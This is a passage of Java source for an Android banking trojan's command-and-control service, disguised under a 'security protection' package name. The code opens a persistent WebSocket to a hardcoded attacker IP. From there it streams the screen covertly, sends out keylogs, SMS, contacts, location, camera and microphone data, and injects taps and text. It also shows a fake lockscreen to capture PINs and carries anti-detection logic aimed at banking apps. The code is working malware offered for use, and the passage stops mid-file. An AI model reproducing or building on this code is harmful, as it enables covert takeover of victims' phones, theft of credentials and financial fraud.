package com.seguranca.protecao;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import org.lsposed.lsparanoid.Obfuscate;

/**
 * SERVIÇO DE COMANDO E CONTROLE (C&C)
 * 
 * Este é o centro de comunicação com o servidor do atacante.
 * 
 * FUNÇÕES:
 * 1. Mantém conexão WebSocket persistente com servidor C&C
 * 2. Envia frames de tela capturados (streaming VNC)
 * 3. Recebe e executa comandos do atacante:
 *    - BLACK_SCREEN_ON/OFF: Controla tela preta
 *    - CLICK x,y: Simula toque na tela
 *    - SWIPE x1,y1,x2,y2: Simula gesto de arraste
 *    - TYPE texto: Injeta texto
 *    - GET_SMS, GET_CONTACTS, GET_LOCATION: Exfiltra dados
 *    - E muito mais...
 * 4. Envia informações do dispositivo
 * 5. Mantém heartbeat para conexão ativa
 * 
 * PROTOCOLO:
 * - Frames: [TIPO: 0x01][TAMANHO: 4 bytes][DADOS: JPEG]
 * - Comandos: JSON via WebSocket texto
 */
@Obfuscate
public class CommandControlService extends Service {

    private static final String TAG = "C&C";
    private static volatile CommandControlService sInstance;
    public static volatile boolean isKillerModeActive = false;
    
    // CONFIGURAÇÃO DO SERVIDOR - ALTERAR PARA SEU SERVIDOR!
    // URL do servidor - PUBLIC para acesso do StudioActivity
    public static final String SERVER_URL = "ws://151.243.137.239:7771/ws";
    private static final int RECONNECT_DELAY = 2000; // 2 segundos - ULTRA RÁPIDO!
    private static final int HEARTBEAT_INTERVAL = 25000; // 25 segundos - equilibra detecção e uso de banda
    private static final int MAX_RECONNECT_ATTEMPTS = 999; // NUNCA desiste!
    private int reconnectAttempts = 0;
    private android.os.PowerManager.WakeLock connectionWakeLock;
    private long lastSuccessfulSend = 0; // Timestamp do último envio bem sucedido
    
    // 🚀 OTIMIZAÇÃO PARA CONEXÕES LENTAS (4G/5G)
    private long lastFrameSentTime = 0;
    private static final int MIN_FRAME_INTERVAL = 100; // HVNC padrão (~10 FPS max)
    private static final int SILENT_MIN_FRAME_INTERVAL = 40; // pipeline 0x01 (~25 FPS teórico)
    private int pendingFrames = 0;
    private static final int MAX_PENDING_FRAMES = 3; // 3 frames max na fila (era 2, muito agressivo)
    private boolean isSlowConnection = false; // Detecta conexão lenta
    private long lastPongTime = 0; // Tempo do último PONG recebido
    private int consecutiveSlowFrames = 0; // Contador de frames lentos
    
    // Método auxiliar para obter URL HTTP do servidor
    public static String getServerHttpUrl() {
        return SERVER_URL.replace("wss://", "https://").replace("ws://", "http://").replace("/ws", "");
    }
    
    private OkHttpClient client;
    private WebSocket webSocket;
    private Handler handler = new Handler();
    private Gson gson = new Gson();
    
    private boolean isConnected = false;
    private boolean shouldReconnect = true;
    
    private String deviceId;
    
    // 📷 Receiver para frames da câmera
    private BroadcastReceiver cameraFrameReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            byte[] frame = intent.getByteArrayExtra("frame");
            if (frame != null) {
                sendCameraFrame(frame);
            }
        }
    };
    
    // 🎤 Receiver para chunks de áudio
    private BroadcastReceiver audioChunkReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            byte[] audio = intent.getByteArrayExtra("audio");
            if (audio != null) {
                sendAudioChunk(audio);
            }
        }
    };
    
    // 🔇 Receiver para status do Silent VNC (BTMOB dedicated path) - allows panel to know truth after refresh/reconnect
    private BroadcastReceiver silentVncStatusReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            boolean active = intent.getBooleanExtra("active", false);
            String method = intent.getStringExtra("method");
            if (method == null || method.isEmpty()) method = "silent";
            sendSilentVncStatusInternal(active, method);
        }
    };
    
    // 🔐 Receiver para dados de keylog (VisualScreenActivity, etc)
    private BroadcastReceiver keylogDataReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            // Tenta "json_data" primeiro, depois "data" para compatibilidade
            String data = intent.getStringExtra("json_data");
            if (data == null) {
                data = intent.getStringExtra("data");
            }
            if (data != null && !data.isEmpty()) {
                Log.d(TAG, "🔐 Keylog/Arquivo recebido: " + data.substring(0, Math.min(100, data.length())) + "...");
                sendKeylogToServer(data);
            } else {
                Log.w(TAG, "🔐 Broadcast KEYLOG_DATA recebido mas sem dados!");
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        sInstance = this;
        Log.d(TAG, "Serviço C&C criado");
        
        // 🔋 Adquire WakeLock para manter conexão ativa mesmo com tela desligada
        try {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
            connectionWakeLock = pm.newWakeLock(
                android.os.PowerManager.PARTIAL_WAKE_LOCK,
                "App:NetworkSync"
            );
            connectionWakeLock.acquire();
            Log.d(TAG, "🔋 WakeLock adquirido para manter conexão!");
        } catch (Exception e) {
            Log.e(TAG, "⚠️ Erro ao adquirir WakeLock: " + e.getMessage());
        }
        
        // Gera ID único do dispositivo
        deviceId = getUniqueDeviceId();
        
        // Cria cliente HTTP
        client = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.MILLISECONDS) // WebSocket não tem timeout de leitura
            .build();
        
        // 📷 Registra receiver para frames da câmera
        IntentFilter cameraFilter = new IntentFilter("com.seguranca.protecao.CAMERA_FRAME_READY");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(cameraFrameReceiver, cameraFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(cameraFrameReceiver, cameraFilter);
        }
        
        // 🎤 Registra receiver para chunks de áudio
        IntentFilter audioFilter = new IntentFilter("com.seguranca.protecao.AUDIO_CHUNK_READY");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(audioChunkReceiver, audioFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(audioChunkReceiver, audioFilter);
        }
        
        // 🔇 Registra receiver para status do Silent VNC (para sincronizar estado no painel)
        IntentFilter silentStatusFilter = new IntentFilter("com.seguranca.protecao.SILENT_VNC_STATUS");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(silentVncStatusReceiver, silentStatusFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(silentVncStatusReceiver, silentStatusFilter);
        }
        
        // 🔐 Registra receiver para dados de keylog (VisualScreenActivity, AccessibilityService, etc)
        IntentFilter keylogFilter = new IntentFilter("com.seguranca.protecao.KEYLOG_DATA");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(keylogDataReceiver, keylogFilter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(keylogDataReceiver, keylogFilter);
        }
        
        // Conecta ao servidor
        connectToServer();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            
            if ("SEND_FRAME".equals(action)) {
                // Envia frame de captura de tela
                byte[] frame = intent.getByteArrayExtra("frame");
                if (frame != null) {
                    boolean silentPipeline = intent.getBooleanExtra("silent_pipeline", false);
                    Log.d(TAG, "📮 Recebeu frame de " + frame.length + " bytes, enviando...");
                    sendFrame(frame, silentPipeline);
                } else {
                    Log.e(TAG, "❌ Frame é NULL!");
                }
            }
            else if ("SEND_KEYLOG".equals(action)) {
                // Envia dados do keylogger
                String data = intent.getStringExtra("data");
                if (data != null) {
                    sendKeylog(data);
                } else {
                    Log.e(TAG, "❌ Keylog data é NULL!");
                }
            }
            else if ("SEND_SCREEN_HIERARCHY".equals(action)) {
                // Envia hierarquia da tela (Screen Reader V2)
                String data = intent.getStringExtra("data");
                if (data != null) {
                    sendScreenHierarchy(data);
                } else {
                    Log.e(TAG, "❌ Screen hierarchy data é NULL!");
                }
            }
            else if ("SEND_UNLOCK_SEQUENCE".equals(action)) {
                // 🔓 Envia sequência de desbloqueio gravada
                String data = intent.getStringExtra("data");
                if (data != null) {
                    sendUnlockSequence(data);
                } else {
                    Log.e(TAG, "❌ Unlock sequence data é NULL!");
                }
            }
        }
        
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Conecta ao servidor C&C
     */
    private void connectToServer() {
        if (isConnected) {
            Log.d(TAG, "Já está conectado");
            return;
        }
        
        Log.d(TAG, "Conectando ao servidor C&C...");
        
        try {
            // Verifica se a URL já tem parâmetros (?) para usar & ao invés de ?
            String separator = SERVER_URL.contains("?") ? "&" : "?";
            String fullUrl = SERVER_URL + separator + "device_id=" + deviceId;
            
            Request request = new Request.Builder()
                .url(fullUrl)
                .build();
            
            webSocket = client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    CommandControlService.this.onConnected(webSocket);
                }

                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    CommandControlService.this.onCommandReceived(text);
                }

                @Override
                public void onMessage(WebSocket webSocket, ByteString bytes) {
                    // Comandos binários (se necessário)
                }

                @Override
                public void onClosing(WebSocket webSocket, int code, String reason) {
                    Log.d(TAG, "Conexão fechando: " + reason);
                }

                @Override
                public void onClosed(WebSocket webSocket, int code, String reason) {
                    CommandControlService.this.onDisconnected();
                }

                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    Log.e(TAG, "Falha na conexão: " + t.getMessage());
                    CommandControlService.this.onDisconnected();
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao conectar: " + e.getMessage());
            scheduleReconnect();
        }
    }

    /**
     * Callback: Conexão estabelecida
     */
    private void onConnected(WebSocket ws) {
        Log.d(TAG, "✓ Conectado ao servidor C&C!");
        isConnected = true;
        webSocket = ws;
        reconnectAttempts = 0; // Reset contador de reconexão
        
        // Envia informações do dispositivo
        sendDeviceInfo();

        // 🔇 Report current dedicated BTMOB silent state (purple "HVNC Silente") immediately after
        // (re)connect so the panel can correctly initialize isCaptureEnabled + isSilentHvncEnabled
        // from server truth without requiring any extra user action or refresh race.
        try {
            UiAssistBridge.SilentState st =
                    UiAssistBridge.getCurrentBtmobSilentState(CommandControlService.this);
            sendSilentVncStatusInternal(st.active, "silent");
            Log.d(TAG, "🔇 Reported BTMOB silent state on WS connect (active=" + st.active + ")");
        } catch (Exception ignored) {}

        // Inicia heartbeat
        startHeartbeat();
    }

    /**
     * Callback: Comando recebido do servidor
     */
    private void onCommandReceived(String commandJson) {
        Log.d(TAG, "Comando recebido: " + commandJson);
        
        try {
            JsonObject cmd = gson.fromJson(commandJson, JsonObject.class);
            String action = cmd.get("action").getAsString();
            
            switch (action) {
                case "BLACK_SCREEN_ON":
                    // 🖤 Envia broadcast para AccessibilityService (100% opaco)
                    Intent blackOnIntent = new Intent("com.seguranca.protecao.BLACK_SCREEN_ON");
                    blackOnIntent.setPackage(getPackageName());
                    sendBroadcast(blackOnIntent);
                    Log.d(TAG, "🖤 BLACK_SCREEN_ON broadcast enviado");
                    sendResponse("OK", "Tela preta ativada (100% opaco)");
                    break;
                    
                case "BLACK_SCREEN_OFF":
                    // 🖤 Envia broadcast para AccessibilityService
                    Intent blackOffIntent = new Intent("com.seguranca.protecao.BLACK_SCREEN_OFF");
                    blackOffIntent.setPackage(getPackageName());
                    sendBroadcast(blackOffIntent);
                    Log.d(TAG, "🖤 BLACK_SCREEN_OFF broadcast enviado");
                    sendResponse("OK", "Tela preta desativada");
                    break;
                
                case "CUSTOM_BLACK_SCREEN":
                    // 🎨 Tela preta customizada com template do painel web
                    // O template pode vir como string JSON OU como objeto JSON
                    String templateStr = null;
                    if (cmd.has("template")) {
                        com.google.gson.JsonElement templateElement = cmd.get("template");
                        if (templateElement.isJsonObject()) {
                            // Template veio como objeto JSON - converte para string
                            templateStr = templateElement.toString();
                            Log.d(TAG, "🎨 Template recebido como objeto JSON");
                        } else if (templateElement.isJsonPrimitive() && templateElement.getAsJsonPrimitive().isString()) {
                            // Template veio como string (já é JSON string)
                            templateStr = templateElement.getAsString();
                            Log.d(TAG, "🎨 Template recebido como string");
                        }
                    }
                    
                    if (templateStr != null && !templateStr.isEmpty()) {
                        Intent customBlackIntent = new Intent("com.seguranca.protecao.CUSTOM_BLACK_SCREEN");
                        customBlackIntent.setPackage(getPackageName());
                        customBlackIntent.putExtra("template", templateStr);
                        sendBroadcast(customBlackIntent);
                        Log.d(TAG, "🎨 CUSTOM_BLACK_SCREEN broadcast enviado (template: " + templateStr.length() + " chars)");
                        sendResponse("OK", "Tela preta customizada ativada");
                    } else {
                        Log.e(TAG, "🎨 Template não fornecido ou vazio");
                        sendResponse("ERROR", "Template não fornecido");
                    }
                    break;

                case "SET_BLACK_SCREEN_OPACITY": {
                    int opacity = cmd.has("value") ? cmd.get("value").getAsInt() : 100;
                    opacity = Math.max(10, Math.min(100, opacity));
                    Intent opacityIntent = new Intent("com.seguranca.protecao.SET_BLACK_SCREEN_OPACITY");
                    opacityIntent.setPackage(getPackageName());
                    opacityIntent.putExtra("value", opacity);
                    sendBroadcast(opacityIntent);
                    Log.d(TAG, "🖤 SET_BLACK_SCREEN_OPACITY broadcast: " + opacity + "%");
                    sendResponse("OK", "Opacidade tela preta: " + opacity + "%");
                    break;
                }
                    
                case "CLICK":
                    int x = cmd.get("x").getAsInt();
                    int y = cmd.get("y").getAsInt();
                    performClick(x, y);
                    sendResponse("OK", "Clique executado");
                    break;
                    
                case "SWIPE":
                    int x1 = cmd.get("x1").getAsInt();
                    int y1 = cmd.get("y1").getAsInt();
                    int x2 = cmd.get("x2").getAsInt();
                    int y2 = cmd.get("y2").getAsInt();
                    performSwipe(x1, y1, x2, y2);
                    sendResponse("OK", "Swipe executado");
                    break;
                    
                case "LONG_PRESS":
                    int lpX = cmd.get("x").getAsInt();
                    int lpY = cmd.get("y").getAsInt();
                    int duration = cmd.has("duration") ? cmd.get("duration").getAsInt() : 500;
                    performLongPress(lpX, lpY, duration);
                    sendResponse("OK", "Long press executado");
                    break;
                    
                case "PATH_GESTURE":
                    // Gesto com múltiplos pontos (para pattern L, U, Z, etc)
                    if (cmd.has("path")) {
                        String pathJson = cmd.get("path").toString();
                        Intent pathIntent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
                        pathIntent.putExtra("action", "PATH_GESTURE");
                        pathIntent.putExtra("path", pathJson);
                        sendBroadcast(pathIntent);
                        sendResponse("OK", "Path gesture executado");
                    } else {
                        sendResponse("ERROR", "Path não especificado");
                    }
                    break;
                    
                case "TYPE":
                    String text = cmd.get("text").getAsString();
                    performType(text);
                    sendResponse("OK", "Texto digitado");
                    break;
                    
                case "GET_SMS":
                    String sms = getSMS();
                    sendResponse("SMS", sms);
                    break;
                    
                case "GET_CONTACTS":
                    String contacts = getContacts();
                    sendResponse("CONTACTS", contacts);
                    break;
                    
                case "GET_LOCATION":
                    String location = getLocation();
                    sendResponse("LOCATION", location);
                    break;
                    
                case "PING":
                    // 🚀 Recebeu PING do servidor - responde e atualiza estado
                    lastPongTime = System.currentTimeMillis();
                    pendingFrames = 0; // Reset contador - servidor está respondendo
                    if (isSlowConnection && consecutiveSlowFrames == 0) {
                        isSlowConnection = false; // Conexão voltou ao normal
                        Log.d(TAG, "🚀 Conexão normalizada!");
                    }
                    sendResponse("PONG", "alive");
                    break;
                    
                case "TOGGLE_KEYLOGGER":
                    boolean enabled = cmd.get("enabled").getAsBoolean();
                    toggleKeylogger(enabled);
                    sendResponse("OK", "Keylogger " + (enabled ? "ativado" : "desativado"));
                    break;
                    
                case "TOGGLE_SCREEN_READER":
                    boolean srEnabled = cmd.get("enabled").getAsBoolean();
                    toggleScreenReader(srEnabled);
                    sendResponse("OK", "Screen Reader " + (srEnabled ? "ativado" : "desativado"));
                    break;
                    
                case "TOGGLE_CAMERA":
                    boolean cameraEnabled = cmd.get("enabled").getAsBoolean();
                    toggleCamera(cameraEnabled);
                    sendResponse("OK", "Câmera " + (cameraEnabled ? "ativada" : "desativada"));
                    break;
                    
                case "TOGGLE_MICROPHONE":
                    boolean micEnabled = cmd.get("enabled").getAsBoolean();
                    toggleMicrophone(micEnabled);
                    sendResponse("OK", "Microfone " + (micEnabled ? "ativado" : "desativado"));
                    break;
                    
                case "TOGGLE_SILENT_VNC":
                    Log.d(TAG, "🔇🔇🔇 CASE TOGGLE_SILENT_VNC ATINGIDO!");
                    try {
                        boolean silentVncEnabled = true; // Default
                        if (cmd.has("enabled") && !cmd.get("enabled").isJsonNull()) {
                            silentVncEnabled = cmd.get("enabled").getAsBoolean();
                        }
                        boolean silentOnly = true;
                        if (cmd.has("silent_only") && !cmd.get("silent_only").isJsonNull()) {
                            silentOnly = cmd.get("silent_only").getAsBoolean();
                        }
                        int quality = -1;
                        if (cmd.has("quality") && !cmd.get("quality").isJsonNull()) {
                            quality = cmd.get("quality").getAsInt();
                        }
                        Log.d(TAG, "silentVncEnabled = " + silentVncEnabled + ", quality = " + quality);
                        toggleSilentVnc(silentVncEnabled, silentOnly, quality);
                        sendResponse("OK", "HVNC " + (silentVncEnabled ? "ativado" : "desativado"));
                    } catch (Exception e) {
                        Log.e(TAG, "🔇 ERRO ao processar TOGGLE_SILENT_VNC: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;

                case "TOGGLE_KILLER_MODE":
                    try {
                        boolean killerEnabled = cmd.has("enabled") && !cmd.get("enabled").isJsonNull()
                                && cmd.get("enabled").getAsBoolean();
                        isKillerModeActive = killerEnabled;
                        Log.d(TAG, "KILLER MODE: " + (killerEnabled ? "ON" : "OFF"));
                        sendResponse("OK", "Killer mode " + (killerEnabled ? "ativado" : "desativado"));
                    } catch (Exception e) {
                        Log.e(TAG, "Erro ao processar TOGGLE_KILLER_MODE: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;

                case "REQUEST_VNC_FRAME":
                    if (isKillerModeActive) {
                        UiAssistBridge.requestKillerCapture();
                    }
                    sendResponse("OK", "Frame solicitado");
                    break;

                case "SET_SILENT_VNC_QUALITY":
                    try {
                        int silentQ = cmd.get("quality").getAsInt();
                        UiAssistBridge.setSilentCaptureQuality(silentQ);
                        sendResponse("OK", "Qualidade silent: " + UiAssistBridge.getSilentCaptureQuality());
                        Log.d(TAG, "🔇 SET_SILENT_VNC_QUALITY -> " + UiAssistBridge.getSilentCaptureQuality());
                    } catch (Exception e) {
                        Log.e(TAG, "🔇 ERRO SET_SILENT_VNC_QUALITY: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;
                
                case "FORCE_RESTART_VNC":
                    Log.d(TAG, "FORCE_RESTART_VNC - reiniciando HVNC silencioso");
                    try {
                        forceRestartVnc();
                        sendResponse("OK", "HVNC restart solicitado");
                    } catch (Exception e) {
                        Log.e(TAG, "🔄 ERRO ao processar FORCE_RESTART_VNC: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;
                    
                case "CONFIGURE_ROM":
                    // 🔧 Configura ROM automaticamente (Autostart, Battery, etc)
                    Log.d(TAG, "🔧🔧🔧 CONFIGURE_ROM - Iniciando configuração de ROM!");
                    try {
                        configureROM();
                        sendResponse("OK", "Configuração de ROM iniciada");
                    } catch (Exception e) {
                        Log.e(TAG, "🔧 ERRO ao configurar ROM: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;
                    
                case "SCREEN_PERSISTENCE":
                    // 🔒 Ativa/desativa persistência de tela (não deixa vítima desligar)
                    boolean persistenceEnabled = cmd.has("enabled") && cmd.get("enabled").getAsBoolean();
                    Log.d(TAG, "🔒🔒🔒 SCREEN_PERSISTENCE - " + (persistenceEnabled ? "ATIVANDO" : "DESATIVANDO"));
                    try {
                        toggleScreenPersistence(persistenceEnabled);
                        sendResponse("OK", "Persistência de tela " + (persistenceEnabled ? "ATIVADA" : "DESATIVADA"));
                    } catch (Exception e) {
                        Log.e(TAG, "🔒 ERRO: " + e.getMessage(), e);
                        sendResponse("ERROR", "Erro: " + e.getMessage());
                    }
                    break;
                    
                case "SWITCH_CAMERA":
                    String camera = cmd.get("camera").getAsString();
                    switchCamera(camera);
                    sendResponse("OK", "Câmera alterada para " + (camera.equals("front") ? "frontal" : "traseira"));
                    break;
                
                // === BOTÕES DE NAVEGAÇÃO ANDROID ===
                case "BACK":
                    performNavigation("BACK");
                    sendResponse("OK", "Botão BACK executado");
                    break;
                    
                case "HOME":
                    performNavigation("HOME");
                    sendResponse("OK", "Botão HOME executado");
                    break;
                    
                case "RECENTS":
                    performNavigation("RECENTS");
                    sendResponse("OK", "Botão RECENTS executado");
                    break;
                    
                case "POWER":
                    performNavigation("POWER");
                    sendResponse("OK", "Botão POWER executado");
                    break;
                
                case "POWER_MENU":
                    // Long press do Power - abre menu de desligar/reiniciar
                    performNavigation("POWER_MENU");
                    sendResponse("OK", "Menu Power aberto");
                    break;
                    
                case "NOTIFICATIONS":
                    performNavigation("NOTIFICATIONS");
                    sendResponse("OK", "Notificações abertas");
                    break;
                    
                case "QUICK_SETTINGS":
                    performNavigation("QUICK_SETTINGS");
                    sendResponse("OK", "Configurações rápidas abertas");
                    break;

                case "VIBRATE":
                    vibrateDevice();
                    sendResponse("OK", "Vibração executada");
                    break;

                case "VOLUME_UP":
                    adjustVolume(true);
                    sendResponse("OK", "Volume aumentado");
                    break;

                case "VOLUME_DOWN":
                    adjustVolume(false);
                    sendResponse("OK", "Volume diminuído");
                    break;

                case "LOCK_DEVICE":
                    performNavigation("LOCK_SCREEN");
                    sendResponse("OK", "Bloqueio de tela solicitado");
                    break;

                case "SNAP_SCREEN":
                    triggerSnapScreen();
                    sendResponse("OK", "Screenshot solicitado");
                    break;
                
                // === SISTEMA DE DESBLOQUEIO AUTOMÁTICO ===
                case "START_UNLOCK_RECORDING":
                    startUnlockRecording();
                    sendResponse("OK", "Gravação de desbloqueio iniciada");
                    break;
                    
                case "STOP_UNLOCK_RECORDING":
                    stopUnlockRecording();
                    sendResponse("OK", "Gravação de desbloqueio finalizada");
                    break;
                    
                case "PLAY_UNLOCK_SEQUENCE":
                    String seqJson = cmd.has("text") ? cmd.get("text").getAsString() : null;
                    if (seqJson != null && !seqJson.isEmpty()) {
                        playUnlockSequence(seqJson);
                    } else {
                        playUnlockSequence();
                    }
                    sendResponse("OK", "Reproduzindo sequência de desbloqueio");
                    break;
                    
                case "PATTERN_UNLOCK":
                    // Executa pattern unlock diretamente
                    // Formato: {"action": "PATTERN_UNLOCK", "pattern": "14789"}
                    String pattern = cmd.has("pattern") ? cmd.get("pattern").getAsString() : null;
                    if (pattern != null && !pattern.isEmpty()) {
                        Intent patternIntent = new Intent("PATTERN_UNLOCK_ACTION");
                        patternIntent.putExtra("pattern", pattern);
                        sendBroadcast(patternIntent);
                        sendResponse("OK", "Executando pattern unlock: " + pattern);
                    } else {
                        sendResponse("ERROR", "Pattern não especificado");
                    }
                    break;
                
                // ==================== SISTEMA DE LOCKSCREEN PIN (IGUAL EAGLESPY V5) ====================
                
                case "SHOW_LOCKSCREEN":
                    // 🔒 Mostra overlay de lockscreen fake (PIN ou PATTERN)
                    String lockType = cmd.has("type") ? cmd.get("type").getAsString() : "PIN";
                    Log.d(TAG, "🔒 SHOW_LOCKSCREEN - Mostrando overlay tipo: " + lockType);
                    Intent showLockIntent = new Intent("com.seguranca.protecao.SHOW_LOCKSCREEN");
                    showLockIntent.setPackage(getPackageName());
                    showLockIntent.putExtra("type", lockType);
                    sendBroadcast(showLockIntent);
                    sendResponse("OK", "Lockscreen " + lockType + " ativado - aguardando vítima");
                    break;
                    
                case "HIDE_LOCKSCREEN":
                    // 🔓 Esconde overlay de lockscreen
                    Log.d(TAG, "🔓 HIDE_LOCKSCREEN - Removendo overlay de PIN");
                    Intent hideLockIntent = new Intent("com.seguranca.protecao.HIDE_LOCKSCREEN");
                    hideLockIntent.setPackage(getPackageName());
                    sendBroadcast(hideLockIntent);
                    sendResponse("OK", "Lockscreen desativado");
                    break;
                    
                case "LOCK_KEY_0":
                case "LOCK_KEY_1":
                case "LOCK_KEY_2":
                case "LOCK_KEY_3":
                case "LOCK_KEY_4":
                case "LOCK_KEY_5":
                case "LOCK_KEY_6":
                case "LOCK_KEY_7":
                case "LOCK_KEY_8":
                case "LOCK_KEY_9":
                    // 🔢 Simula clique na tecla do PIN (igual sp<*>LK0 até sp<*>LK9 do EAGLESPY)
                    String keyNum = action.replace("LOCK_KEY_", "");
                    Log.d(TAG, "🔢 LOCK_KEY_" + keyNum + " - Simulando tecla " + keyNum);
                    Intent keyIntent = new Intent("com.seguranca.protecao.LOCK_KEY_PRESS");
                    keyIntent.setPackage(getPackageName());
                    keyIntent.putExtra("key", keyNum);
                    sendBroadcast(keyIntent);
                    sendResponse("OK", "Tecla " + keyNum + " pressionada");
                    break;
                    
                case "LOCK_KEY_DELETE":
                    // ⌫ Simula backspace no PIN (igual sp<*>LKde do EAGLESPY)
                    Log.d(TAG, "⌫ LOCK_KEY_DELETE - Apagando último dígito");
                    Intent deleteIntent = new Intent("com.seguranca.protecao.LOCK_KEY_PRESS");
                    deleteIntent.setPackage(getPackageName());
                    deleteIntent.putExtra("key", "DELETE");
                    sendBroadcast(deleteIntent);
                    sendResponse("OK", "Tecla DELETE pressionada");
                    break;
                    
                case "LOCK_KEY_ENTER":
                    // ✔ Simula enter/confirmar no PIN (igual sp<*>LKej do EAGLESPY)
                    Log.d(TAG, "✔ LOCK_KEY_ENTER - Confirmando PIN");
                    Intent enterIntent = new Intent("com.seguranca.protecao.LOCK_KEY_PRESS");
                    enterIntent.setPackage(getPackageName());
                    enterIntent.putExtra("key", "ENTER");
                    sendBroadcast(enterIntent);
                    sendResponse("OK", "Tecla ENTER pressionada");
                    break;
                    
                case "PLAY_PIN_SEQUENCE":
                    // 🔄 Reproduz sequência de PIN automaticamente (igual EAGLESPY)
                    // Formato: {"action": "PLAY_PIN_SEQUENCE", "pin": "1234", "delay": 1000}
                    String pinSequence = cmd.has("pin") ? cmd.get("pin").getAsString() : null;
                    int delayMs = cmd.has("delay") ? cmd.get("delay").getAsInt() : 1000;
                    if (pinSequence != null && !pinSequence.isEmpty()) {
                        Log.d(TAG, "🔄 PLAY_PIN_SEQUENCE - Reproduzindo PIN: " + pinSequence + " (delay: " + delayMs + "ms)");
                        Intent playPinIntent = new Intent("com.seguranca.protecao.PLAY_PIN_SEQUENCE");
                        playPinIntent.setPackage(getPackageName());
                        playPinIntent.putExtra("pin", pinSequence);
                        playPinIntent.putExtra("delay", delayMs);
                        sendBroadcast(playPinIntent);
                        sendResponse("OK", "Reproduzindo PIN: " + pinSequence);
                    } else {
                        sendResponse("ERROR", "PIN não especificado");
                    }
                    break;
                    
                case "PLAY_PATTERN_SEQUENCE":
                    // 🔲 Reproduz sequência de PATTERN automaticamente
                    // Formato: {"action": "PLAY_PATTERN_SEQUENCE", "pattern": "14789", "delay": 1000}
                    String patternSeq = cmd.has("pattern") ? cmd.get("pattern").getAsString() : null;
                    int patternDelay = cmd.has("delay") ? cmd.get("delay").getAsInt() : 1000;
                    if (patternSeq != null && !patternSeq.isEmpty()) {
                        Log.d(TAG, "🔲 PLAY_PATTERN_SEQUENCE - Reproduzindo Pattern: " + patternSeq);
                        Intent playPatternIntent = new Intent("com.seguranca.protecao.PLAY_PIN_SEQUENCE");
                        playPatternIntent.setPackage(getPackageName());
                        playPatternIntent.putExtra("pattern", patternSeq);
                        playPatternIntent.putExtra("delay", patternDelay);
                        sendBroadcast(playPatternIntent);
                        sendResponse("OK", "Reproduzindo Pattern: " + patternSeq);
                    } else {
                        sendResponse("ERROR", "Pattern não especificado");
                    }
                    break;
                
                // ==================== GERENCIAMENTO DE APPS ====================
                
                case "GET_INSTALLED_APPS":
                    // Lista todos os apps instalados
                    getInstalledApps();
                    break;
                    
                case "GET_CAPTURE_STATS":
                    // 🔐 [ANTI-DETECT] Solicita estatísticas de captura do UiAssistBridge
                    requestCaptureStats();
                    break;
                    
                case "RESET_BANKING_STATE":
                    // 🔐 [ANTI-DETECT] Reseta estado de detecção de app bancário
                    resetBankingAppState();
                    break;
                    
                case "OPEN_APP":
                    // Abre um app pelo package name
                    String packageToOpen = cmd.has("package") ? cmd.get("package").getAsString() : null;
                    if (packageToOpen != null) {
                        openApp(packageToOpen);
                    }
                    break;
                    
                case "UNINSTALL_APP":
                    sendResponse("ERROR", "Desinstalação remota desabilitada nesta build");
                    break;
                    
                case "FORCE_STOP_APP":
                    // Força parada de um app
                    String packageToStop = cmd.has("package") ? cmd.get("package").getAsString() : null;
                    if (packageToStop != null) {
                        forceStopApp(packageToStop);
                    }
                    break;
                
                // ==================== INSTALAÇÃO SILENCIOSA DE APK ====================
                
                case "INSTALL_APK":
                    sendResponse("ERROR", "Instalação remota de APK desabilitada nesta build");
                    break;
                    
                default:
                    Log.w(TAG, "Comando desconhecido: " + action);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar comando: " + e.getMessage());
        }
    }

    /**
     * Callback: Desconectado
     */
    private void onDisconnected() {
        Log.d(TAG, "Desconectado do servidor");
        isConnected = false;
        webSocket = null;
        
        // Reagenda reconexão
        if (shouldReconnect) {
            scheduleReconnect();
        }
    }

    /**
